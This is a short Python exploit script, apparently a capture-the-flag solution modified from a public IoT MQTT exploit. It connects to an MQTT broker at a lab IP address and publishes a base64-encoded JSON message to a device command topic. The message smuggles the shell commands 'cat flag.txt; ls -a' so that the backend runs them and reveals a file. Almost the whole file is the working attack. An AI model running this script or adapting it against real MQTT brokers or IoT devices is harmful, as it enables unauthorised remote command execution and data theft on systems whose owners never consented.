#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os
import base64

HOST = "10.10.110.82"
PORT = 1883

def on_connect(client, userdata, flags, rc):
    print("Connected...")

def on_message(client, userdata, message):
    print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
    print("Starting...\n")
    client = mqtt.Client()
    client.on_connect = on_connect
    # client.on_message = on_message
    client.connect(HOST, PORT)
    for i in range(0, 1):
        # client.publish('U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub', "{'id':'cdd1b1c0-1c40-4b0f-8e22-61b357548b7d', 'SYS':'ls'}")
        msg='{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd":"CMD", "arg":"cat flag.txt; ls -a"}'
        b64_msg=base64.b64encode(msg.encode('utf-8'))
        client.publish('XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub', b64_msg)
        time.sleep(1)
        print("Sending")
        print(b64_msg)
    #client.loop_forever()
    #client.loop_stop()

if __name__ == "__main__":
    main()
